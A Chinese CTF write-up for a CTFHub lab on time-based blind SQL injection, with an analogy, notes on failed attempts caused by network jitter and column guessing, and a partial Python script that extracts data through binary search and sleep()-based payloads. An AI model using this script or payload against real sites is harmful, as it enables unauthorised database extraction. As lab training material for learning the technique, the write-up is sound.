SQL时间盲注 - CTFHub Web 高级 Writeup

2026年9月17日 CTFHub Web安全 SQL注入 时间盲注

这是我做过最耗时、最折磨人的一道 SQL 注入题。在经历了布尔盲注的“真假”判定后，时间盲注彻底把反馈机制降到了最低——页面既不回显数据，也不报错，甚至看不出“真假”状态，唯一的反馈就是“响应时间”。本篇 Writeup 记录了我在网络波动中疯狂踩坑，并最终用二分查找+高容错逻辑通关的全过程。

一、大白话解释：什么是时间盲注？

比喻： 之前的联合查询是傻子把答案写给你看；报错注入是傻子大喊答案；布尔盲注是傻子通过“笑”或“哭”暗示你。而时间盲注，傻子变成了一个面瘫。你和傻子约定好：“如果我猜对了，你就等5秒再回答我；如果我猜错了，你立刻回答。”我们通过页面加载时间的长短，就能判断答案是否正确。

二、解题过程（极其曲折的踩坑全记录）

1. 踩坑第一步：网络波动导致 Flag 误报

第一次写脚本时，我设置了 sleep(1)，且阈值判定为 > 0.7 秒。结果跑了十几分钟后，脚本输出：ctfhub{a566fb6835cD8G65652}。

提交后报错！原因分析： 因为 1 秒的延迟太容易被网络抖动干扰，某些字符（比如大写字母 `D` 和 `G`）的 ASCII 码在波动中被错误推算。时间盲注极其依赖环境稳定性。

2. 踩坑第二步：猜错列名导致程序提前结束

修改代码后，脚本成功猜出了数据库名 sqli，表名 flag,news。但在猜列名时，只猜出一个字母 f 就判定结束，导致最终执行了 select f from flag，页面无返回。原因是“空字符串”判断逻辑在波动中误判，提前跳出了循环。

3. 成功破局：高容错脚本 + 跳过猜列名

吸取教训后，我采用了两大优化：

  • 把 sleep(1) 改为 sleep(2)，阈值提升为 > 1.5 秒，大幅过滤网络波动。
  • 不再死磕猜列名，直接尝试最常见的组合 select flag from flag 和 select flag from news。

最终，脚本稳定输出了正确的 Flag。

最终 Flag： ctfhub{81ed75ee8481533a7e97ca8a}

三、最终高容错 Python 脚本（关键部分）

import requests
import time

def is_true(payload):
    start = time.time()
    try:
        requests.get(url + "?id=" + payload, timeout=10)
    except Exception:
        pass
    return (time.time() - start) > 1.5  # 提升容错阈值

def guess_char(sql, index):
    left, right = 32, 127
    while left <= right:
        mid = (left + right) // 2
        payload = f"1 and if(ascii(substr(({sql}), {index}, 1)) > {mid}, sleep(2), 0)"
        if is_true(payload):
            left = mid + 1
        else:
            right = mid - 1
    return chr(left)

# 跳过猜测列名，直接尝试常用组合
print("尝试: select flag from flag")
flag = get_string("select flag from flag")

if not flag:
    print("尝试: select flag from news")
    flag = get_string("select flag from news")

print(f"最终 Flag: {flag}")

四、知识点总结与反思

💡 时间盲注最怕网络波动： sleep 时间不宜过短，否则极易被网络延迟干扰导致误报。同时判定阈值也要合理提高（如 1.5 秒以上）。

💡 不要死磕猜列名： 在已知表名的情况下，绝大多数出题人的列名也直接叫 flag。节省时间去尝试硬编码组合，往往比死磕猜测更高效。

💡 环境容错： CTFHub 环境很容易过期。跑盲注脚本时，一旦发现响应速度突然变快（不再触发 sleep），大概率是环境过期了，需要及时续期更换 URL。
